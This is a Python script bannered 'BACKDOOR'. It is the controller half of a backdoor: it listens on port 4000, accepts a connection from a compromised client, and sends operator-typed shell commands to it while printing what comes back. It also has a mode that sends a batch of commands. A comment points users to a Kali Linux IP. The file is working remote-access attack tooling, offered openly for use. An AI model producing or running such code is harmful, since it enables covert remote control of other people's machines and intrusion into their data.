import socket
import subprocess
import ast
import colorama
from colorama import Fore, Style, init

colorama.init()

print(f'''{Fore.LIGHTGREEN_EX}

██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                  
''')


class Server:
    def __init__(self, host_ip, host_port):
        self.host_ip = host_ip
        self.host_port = host_port
    def start_conn(self):

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host_ip,self.host_port))

        print(f"{Fore.LIGHTGREEN_EX}[*]{Fore.LIGHTWHITE_EX} Server Initiated...")
        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Listening to the Client... ~~(8:>)")

        server.listen(1)
        self.client, self.client_addr = server.accept()

        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Received Connection from", self.client_addr)
    def online_interaction(self):
        while True:
            interface = f'{Fore.LIGHTMAGENTA_EX}[+]{Fore.LIGHTGREEN_EX} '+ str(self.client_addr[0]) + f":shell~${Fore.LIGHTWHITE_EX} "
            command = input(interface)
            print(command)
            self.client.send(command.encode())
            recv_data = self.client.recv(1024).decode()
            if recv_data == b"":
                continue
            print("\n", recv_data, "\n")
    def offline_interaction(self,list_of_commands):
        self.client.send(str(list_of_commands).encode())
        recv_data = self.client.recv(1024).decode()
        print(F"{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX}Received output data from Client\n\n")
        print(recv_data)

if __name__ == '__main__':
    server = Server('', 4000) # YOUR IP KALI LINUX
    server.start_conn()
    server.online_interaction()
